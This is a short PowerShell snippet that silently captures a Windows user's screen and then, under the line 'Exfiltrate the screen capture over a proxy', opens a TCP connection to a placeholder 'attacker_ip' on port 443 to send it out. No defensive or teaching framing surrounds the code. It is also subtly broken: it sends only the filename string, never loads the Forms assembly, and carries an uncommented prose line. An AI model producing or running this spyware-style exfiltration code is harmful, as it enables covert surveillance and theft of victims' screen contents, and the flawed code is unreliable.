Add-Type -AssemblyName System.Drawing
$screen = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($screen)
$graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)
$screen.Save("C:\screen_capture.png", [System.Drawing.Imaging.ImageFormat]::Png)
Exfiltrate the screen capture over a proxy

$ip = "attacker_ip"
$port = 443
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
$writer.Write("screen_capture.png")
$writer.Flush()
$client.Close()
